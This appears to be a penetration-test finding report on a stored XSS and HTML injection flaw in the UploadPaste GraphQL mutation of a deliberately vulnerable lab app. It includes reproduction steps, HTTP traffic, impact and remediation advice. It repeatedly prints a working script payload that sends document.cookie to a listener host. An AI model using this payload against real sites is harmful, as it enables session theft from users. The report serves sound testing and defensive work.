# DVGA-011 — Stored XSS and HTML Injection via UploadPaste

## Severity

Critical

CVSS v3.1 Score: 9.3 (Critical)

Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N

## Overall CVSS Calculation

Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
CVSS Base Score:          9.3
Impact Subscore:          5.8
Exploitability Subscore:  2.8
CVSS Temporal Score:      NA
CVSS Environmental Score: NA
Modified Impact Subscore: NA
Overall CVSS Score:       9.3

## Vulnerability Type

**Stored Cross-Site Scripting (Stored XSS) / HTML Injection**

## CWE

**CWE-79 — Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')**

## OWASP Mapping

**OWASP Top 10 2021 — A03: Injection**

---

## Affected Functionality

**Browser Endpoints:**

* `/upload_paste`
* `/my_pastes`

**Affected API Endpoint:**

* `/graphql`

**Affected GraphQL Operations:**

* `mutation UploadPaste`
* `query getPastes`

**Affected Mutation Field:**

* `uploadPaste`

**Affected Mutation Argument:**

* `content`

**Affected Query Field:**

* `pastes`

**Affected Returned Field:**

* `content`

The payload is uploaded through the `content` argument of the `UploadPaste` mutation. After the paste is stored, the same content is returned through the `getPastes` operation, specifically through the `pastes.content` field, and is then rendered on `/my_pastes`.

---

## Description

While testing the `/upload_paste` functionality, I tried uploading a paste containing both an XSS payload and some basic HTML tags.

The content I uploaded was:

```html
<script>fetch(`http://192.168.1.230/?c=${document.cookie}`, {mode:'no-cors'})</script>
<mark>XSSED</mark> </br>
<h1 style="color:red">XSSED</h1>
```

Interestingly, both the JavaScript and HTML parts of the payload were executed.

The JavaScript payload sent a request to my `server.py` listener with the value of `document.cookie`. I received the request successfully on my server, including the cookie value. This confirmed that the JavaScript was actually executing in the browser.

The HTML tags were also interpreted by the browser instead of being shown as plain text. For example, the `<mark>` and `<h1>` elements were rendered as HTML.

This shows that the `content` supplied through `UploadPaste` is being stored without proper sanitization or encoding and is later rendered as active HTML/JavaScript on `/my_pastes`.

---

## Steps to Reproduce

### 1. Open `/upload_paste`

Navigate to:

```text
/upload_paste
```

### 2. Upload a paste containing the payload

The uploaded file contains:

```html
<script>fetch(`http://192.168.1.230/?c=${document.cookie}`, {mode:'no-cors'})</script>
<mark>XSSED</mark> </br>
<h1 style="color:red">XSSED</h1>
```

The exact file used during testing is available at:

```text
Uploaded-Materials-By-Me/uploaded-paste.txt
```

### 3. Observe the GraphQL request

The upload functionality sends the content through the `UploadPaste` mutation:

```http
POST /graphql HTTP/2
Host: merlin-declivitous-crowdedly.ngrok-free.dev
Cookie: abuse_interstitial=merlin-declivitous-crowdedly.ngrok-free.dev; chat_session_id=ac1813ce-74a0-4f9f-a7b5-e4b9caafeb6a; env=graphiql:disable
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:154.0) Gecko/20100101 Firefox/154.0
Accept: application/json
Content-Type: application/json
Referer: https://merlin-declivitous-crowdedly.ngrok-free.dev/upload_paste
Origin: https://merlin-declivitous-crowdedly.ngrok-free.dev

{"query":"mutation UploadPaste ($filename: String!, $content: String!) {
          uploadPaste(filename: $filename, content:$content)
          {
            result
          }
        }","variables":{"content":"<script>fetch(`http://192.168.1.230/?c=${document.cookie}`, {mode:'no-cors'})</script>\r\n<mark>XSSED</mark> </br>\r\n<h1 style=\"color:red\">XSSED</h1>","filename":"uploaded-paste.txt"}}
```

The `content` value is accepted as supplied, including the `<script>` and HTML elements.

### 4. Observe the response

The application returns the uploaded content without removing or encoding the HTML/JavaScript:

```http
HTTP/2 200 OK
Content-Type: application/json

{"data":{"uploadPaste":{"result":"<script>fetch(`http://192.168.1.230/?c=${document.cookie}`, {mode:'no-cors'})</script>\r\n<mark>XSSED</mark> </br>\r\n<h1 style=\"color:red\">XSSED</h1>"}}
```

At this point, the malicious content has been accepted and stored by the application.

### 5. Open `/my_pastes`

Navigate to:

```text
/my_pastes
```

The application retrieves the stored pastes using the following GraphQL query:

```graphql
query getPastes {
    pastes(public:false) {
        id
        title
        content
        ipAddr
        userAgent
        owner {
            name
        }
    }
}
```

### 6. Observe the stored content

The stored payload is returned through the `pastes.content` field without being sanitized:

```json
{
  "data": {
    "pastes": [
      {
        "id": "15",
        "title": "Imported Paste from File - 16bbfc",
        "content": "<script>fetch(`http://192.168.1.230/?c=${document.cookie}`, {mode:'no-cors'})</script>\r\n<mark>XSSED</mark> </br>\r\n<h1 style=\"color:red\">XSSED</h1>",
        "ipAddr": "172.17.0.1",
        "userAgent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "owner": {
          "name": "DVGAUser"
        }
      }
    ]
  }
}
```

### 7. Confirm Stored XSS execution

When the stored paste is rendered on `/my_pastes`, the `<script>` element executes in the browser.

The payload sends:

```text
document.cookie
```

to my listener at:

```text
http://192.168.1.230/
```

The request was successfully received by my `server.py` script, and the cookie value was included in the request.

This confirms that the stored content is not simply being returned by the API. It is being interpreted and executed by the browser.

### 8. Confirm HTML Injection

The following HTML was also rendered as HTML:

```html
<mark>XSSED</mark>
```

and:

```html
<h1 style="color:red">XSSED</h1>
```

Instead of displaying these tags as text, the browser interpreted them as actual HTML elements.

---

## Proof of Concept

### XSS Payload

```html
<script>fetch(`http://192.168.1.230/?c=${document.cookie}`, {mode:'no-cors'})</script>
```

The payload executes JavaScript in the application's browser context and sends the value of `document.cookie` to the tester-controlled listener.

### HTML Injection Payload

```html
<mark>XSSED</mark> </br>
<h1 style="color:red">XSSED</h1>
```

Both HTML elements were interpreted and rendered by the browser.

### Execution Confirmation

The callback received by my `server.py` listener confirms that the JavaScript executed successfully.

The testing demonstrated the complete attack flow:

1. The payload is accepted by `UploadPaste`.
2. The malicious content is stored.
3. The content is returned through `getPastes`.
4. The `pastes.content` field contains the original HTML/JavaScript.
5. `/my_pastes` renders the stored content.
6. The browser executes the injected JavaScript.
7. The JavaScript is able to access `document.cookie` and send it to the tester-controlled listener.

---

## Technical Details

The vulnerable flow is:

```text
/upload_paste
      |
      v
UploadPaste mutation
      |
      | content = attacker-controlled HTML/JavaScript
      v
Stored paste
      |
      v
getPastes query
      |
      v
pastes.content
      |
      v
/my_pastes
      |
      v
Browser renders stored content
      |
      v
JavaScript execution
```

The main issue is that the application treats the uploaded paste content as trusted HTML when it reaches the browser.

The `UploadPaste` mutation accepts the attacker-controlled `content`, and the value is stored without adequate sanitization. The same value is then returned by the `getPastes` query and rendered on `/my_pastes`.

Because the content is rendered as HTML rather than safely displayed as text, an attacker-controlled `<script>` element can execute in the application's browser context.

---

## Impact

An attacker who is able to upload a paste could store malicious JavaScript that executes when the affected paste is viewed through `/my_pastes`.

Successful exploitation could allow an attacker to:

* Execute arbitrary JavaScript in the application's origin.
* Access information available to JavaScript in the victim's browser context.
* Perform actions as the victim within the application.
* Read cookies that are accessible through JavaScript.
* Modify the application's page content.
* Inject malicious HTML into the trusted application interface.
* Potentially steal other browser-accessible sensitive information.

In this test, the impact was demonstrated by successfully accessing `document.cookie` and receiving its value on the tester-controlled `server.py` listener.

---

## Root Cause

The root cause is improper handling of user-controlled paste content before it is rendered by the browser.

The `content` argument of the `UploadPaste` mutation accepts raw HTML and JavaScript. The stored value is then returned through the `pastes.content` field and rendered by `/my_pastes` without sufficient output encoding or HTML sanitization.

As a result, content that should have been treated as untrusted text is interpreted by the browser as executable HTML and JavaScript.

---

## Remediation

The application should treat uploaded paste content as untrusted data and prevent it from being interpreted as executable HTML.

Recommended fixes include:

1. **Render paste content as text**

   If HTML is not an intended feature, render the content using safe text APIs such as `textContent` rather than inserting it as HTML.

2. **Apply proper output encoding**

   Encode user-controlled content before placing it into an HTML document.

3. **Avoid unsafe HTML rendering**

   Avoid directly inserting user-controlled paste content through sinks such as `innerHTML` unless the content has first been properly sanitized.

4. **Sanitize HTML if HTML is intentionally supported**

   If the application is supposed to support some HTML formatting, use a well-maintained HTML sanitizer with an explicit allowlist of safe tags and attributes.

5. **Block executable HTML constructs**

   When HTML is not required, elements such as `<script>` and event-handler attributes such as `onclick` and `onerror` should not be allowed to reach the rendered page.

6. **Implement Content Security Policy as defense in depth**

   A restrictive CSP can reduce the impact of XSS, but it should be used as an additional security layer rather than as a replacement for proper output encoding and sanitization.

---

## Evidence

Relevant evidence for this finding is stored under:

```text
evidence/DVGA-011-Stored-XSS-via-UploadPaste/
```

The evidence contains the relevant requests, responses, screenshots, and the successful XSS callback received by the tester-controlled `server.py` listener.

The exact uploaded test file is available at:

```text
Uploaded-Materials-By-Me/uploaded-paste.txt
```
